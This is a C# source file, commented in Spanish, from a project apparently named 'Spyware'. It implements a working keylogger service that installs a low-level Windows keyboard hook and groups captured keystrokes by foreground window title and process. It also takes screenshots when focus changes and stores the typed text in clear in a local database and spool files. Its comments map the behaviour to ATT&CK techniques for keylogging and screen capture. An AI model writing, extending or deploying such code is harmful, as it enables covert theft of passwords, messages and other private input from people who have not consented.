using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Scheduling;
using Spyware.Core.Security;
using Spyware.Storage;

namespace Spyware.Collectors.Keyboard;

/// <summary>
/// T1056.001 Input Capture: Keylogging + T1010 Application Window Discovery.
/// El hook solo encola; aquí se traduce, se agrupa en ráfagas y se guarda en claro.
/// </summary>
public sealed class KeyCaptureService : ICollector
{
    // Techo por ciclo de drenaje: si alguien pega texto con auto-repetición, la cola
    // puede traer miles de pulsaciones; se vacían en ciclos siguientes.
    private const int MaxKeysPerDrain = 4096;
    private const int WindowCacheSeconds = 5;

    private readonly AgentPaths _paths;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly KeyboardSection _config;
    private readonly Func<ScreenshotEvent?>? _focusCapture;
    private readonly Func<IntPtr> _foregroundHandle;
    private readonly Func<WindowInfo> _windowProbe;
    private readonly ILog _log;
    private readonly KeylogHook _hook;
    private readonly object _gate = new();

    private PeriodicTask? _task;
    private KeylogBurst? _burst;
    private WindowInfo _windowCache = WindowInfo.Unknown;
    private DateTime _windowCacheUtc = DateTime.MinValue;
    private string? _lastHash;
    private DateTime _lastFocusCaptureUtc = DateTime.MinValue;
    private bool _started;

    public string Name => "keyboard";

    public int CapturedCount { get; private set; }
    public int KeyCount { get; private set; }
    public int DuplicateCount { get; private set; }

    /// <summary>Estado del hook para diagnóstico: instalación, pulsaciones recibidas y descartadas.</summary>
    public string HookState => _hook.Describe();

    public KeyCaptureService(AgentPaths paths, LocalEventRepository repository, SpoolManager spool,
                             KeyboardSection config, ILog log,
                             Func<ScreenshotEvent?>? focusCapture = null, KeylogHook? hook = null,
                             Func<IntPtr>? foregroundHandle = null, Func<WindowInfo>? windowProbe = null)
    {
        _paths = paths;
        _repository = repository;
        _spool = spool;
        _config = config;
        _log = log;
        _focusCapture = focusCapture;
        _hook = hook ?? new KeylogHook();

        // Sondas inyectables: en producción son las API de ventana; las pruebas ponen una
        // ventana conocida para comprobar a qué ventana pertenece cada ráfaga.
        _foregroundHandle = foregroundHandle ?? ForegroundWindow.CurrentHandle;
        _windowProbe = windowProbe ?? ForegroundWindow.Describe;
    }

    public void Start()
    {
        if (!_config.Enabled)
        {
            _log.Info("Collector de teclado deshabilitado.");
            return;
        }

        _hook.Start();
        _started = true;

        if (!_hook.IsInstalled)
        {
            // Sin hook no hay pulsaciones: hay que avisar en vez de dar por hecho que funciona.
            _log.Warn($"El teclado no está capturando: hook {HookState}.");
            return;
        }

        int seconds = Math.Max(1, _config.IdleFlushMilliseconds / 1000);
        _task = new PeriodicTask(Name, DrainAndFlush, TimeSpan.FromSeconds(seconds), 0, _log);
        _task.Start(runImmediately: false);

        _log.Info("Hook WH_KEYBOARD_LL instalado; ráfagas cerradas tras " +
                  $"{_config.IdleFlushMilliseconds} ms sin pulsaciones, al cambiar de ventana " +
                  $"o al alcanzar {_config.MaxBufferCharacters} caracteres.");
    }

    public void Stop()
    {
        // Sin guarda de _started: la parada también se llama tras un arranque parcial (el
        // hook no pudo instalarse) y debe dejar cerrada la ráfaga que hubiera pendiente.
        _started = false;
        _task?.Dispose();
        _task = null;
        _hook.Stop();

        lock (_gate)
        {
            DrainLocked();
            FlushLocked("parada");
        }
    }

    /// <summary>Vacía la cola del hook y cierra la ráfaga si ya está en pausa.</summary>
    private void DrainAndFlush()
    {
        lock (_gate)
        {
            DrainLocked();

            if (_burst is { } burst &&
                (burst.IsIdle(DateTime.UtcNow, _config.IdleFlushMilliseconds) ||
                 burst.IsFull(_config.MaxBufferCharacters)))
            {
                FlushLocked("pausa");
            }
        }
    }

    private void DrainLocked()
    {
        int processed = 0;

        while (processed < MaxKeysPerDrain && _hook.TryDequeue(out RawKey key))
        {
            processed++;
            KeyCount++;

            KeyTranslation translation = KeyTranslator.Translate(
                key.VirtualKey, key.ScanCode, key.Flags, _config.RecordSpecialKeys);

            if (translation.IsModifier) continue;

            WindowInfo window = DescribeWindow(key.TimestampUtc);

            if (_burst is null)
                _burst = new KeylogBurst(window, key.TimestampUtc);
            else if (!_burst.IsSameWindowAs(window.Handle))
            {
                // Cambio de foco: la ráfaga anterior se cierra con su ventana, no se
                // reetiqueta con la nueva (cada fila dice dónde se escribió realmente).
                FlushLocked("cambio de ventana");
                _burst = new KeylogBurst(window, key.TimestampUtc);
            }

            if (!_burst.AppendGap(key.TimestampUtc, _config.GapMarkerSeconds, _config.MaxBufferCharacters))
            {
                FlushLocked("búfer lleno");
                _burst = new KeylogBurst(window, key.TimestampUtc);
            }

            if (translation.IsBackspace && _config.HonorBackspace)
            {
                _burst.RegisterKey(key.TimestampUtc);
                _burst.Backspace();
                continue;
            }

            string fragment = translation.Text.Length > 0 ? translation.Text : translation.Token;

            if (!_burst.Append(fragment, _config.MaxBufferCharacters))
            {
                // La ráfaga va llena: se guarda tal cual y la tecla que no cabía abre la
                // siguiente, así no se pierden pulsaciones ni se cuentan dos veces.
                FlushLocked("búfer lleno");
                _burst = new KeylogBurst(window, key.TimestampUtc);
                _burst.Append(fragment, _config.MaxBufferCharacters);
            }

            _burst.RegisterKey(key.TimestampUtc);
        }

        if (_hook.DroppedCount > 0)
        {
            _log.Warn($"Cola del hook saturada: {_hook.DroppedCount} pulsaciones descartadas.");
            _hook.ResetDropped();
        }
    }

    /// <summary>
    /// Ventana en primer plano, con caché corto: el título cambia al navegar y consultar
    /// el proceso en cada tecla sería caro. Un cambio de HWND fuerza la consulta.
    /// </summary>
    private WindowInfo DescribeWindow(DateTime utc)
    {
        if (!_config.RecordWindowTitles)
            return WindowInfo.Unknown;

        IntPtr handle = _foregroundHandle();

        if (handle != _windowCache.Handle ||
            (utc - _windowCacheUtc).TotalSeconds >= WindowCacheSeconds)
        {
            if (handle != _windowCache.Handle)
                CaptureFocusChange(utc);

            _windowCache = _windowProbe();
            _windowCacheUtc = utc;
        }

        return _windowCache;
    }

    /// <summary>Captura de pantalla al cambiar la ventana en primer plano (T1113 encadenada).</summary>
    private void CaptureFocusChange(DateTime utc)
    {
        if (_focusCapture is null || !_config.CaptureOnFocusChange) return;

        if ((utc - _lastFocusCaptureUtc).TotalSeconds < _config.FocusCaptureMinimumSeconds)
            return;

        _lastFocusCaptureUtc = utc;

        try
        {
            _focusCapture.Invoke();
        }
        catch (Exception ex)
        {
            _log.Warn("La captura por cambio de foco falló: " + ex.Message);
        }
    }

    private void FlushLocked(string reason)
    {
        KeylogBurst? burst = _burst;
        _burst = null;

        if (burst is null || burst.KeyCount == 0 || burst.Text.Length == 0) return;

        string text = burst.Text;
        int max = Math.Max(64, _config.MaxTextLength);
        bool truncated = burst.Overflowed || text.Length > max;
        if (text.Length > max)
            text = text[..max] + "\n…[truncado]";

        string hash = HashHelper.Sha256Hex(text + "|" + burst.Window.Title + "|" + burst.Window.ProcessName);

        if (_config.SkipDuplicates && hash == _lastHash)
        {
            DuplicateCount++;
            _log.Debug($"Ráfaga idéntica ({hash[..12]}…): no se almacena.");
            return;
        }

        _lastHash = hash;
        DateTime now = DateTime.UtcNow;

        string? path = _config.SaveTextCopy ? _spool.SaveKeylogText(text, now) : null;

        long id = _repository.InsertKeyEvent(new KeyEvent
        {
            TimestampUtc = now,
            StartedUtc = burst.StartedUtc,
            Text = text,
            KeyCount = burst.KeyCount,
            CharCount = text.Length,
            Truncated = truncated,
            WindowTitle = burst.Window.Title,
            ProcessName = burst.Window.ProcessName,
            Hash = hash,
            FilePath = path
        });

        CapturedCount++;
        _repository.SetMeta("keys_last_id", id.ToString());

        _log.Info($"Teclado: {burst.KeyCount} pulsaciones, {text.Length} caracteres en " +
                  $"{burst.Window.ProcessName} · «{Shorten(burst.Window.Title)}» ({reason}).");
    }

    private static string Shorten(string? value)
    {
        if (string.IsNullOrWhiteSpace(value)) return "(sin título)";

        string single = value.Replace('\r', ' ').Replace('\n', ' ').Trim();
        return single.Length <= 60 ? single : single[..60] + "…";
    }
}
